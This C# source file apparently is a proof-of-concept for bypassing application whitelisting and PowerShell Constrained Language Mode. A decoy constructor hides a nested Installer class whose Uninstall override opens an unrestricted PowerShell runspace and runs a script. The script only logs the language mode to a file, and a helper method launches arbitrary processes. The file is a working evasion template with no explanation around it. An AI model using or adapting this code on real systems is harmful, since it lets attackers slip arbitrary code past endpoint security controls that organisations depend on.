using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

[ComVisible(true)]
public class TestClass
{
    public TestClass()
    {
        Console.WriteLine("This is the main method which is a decoy");
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File - FilePath C:\\Tools\\test.txt";
            Runspace rs = RunspaceFactory.CreateRunspace(); rs.Open();
            PowerShell ps = PowerShell.Create(); ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}

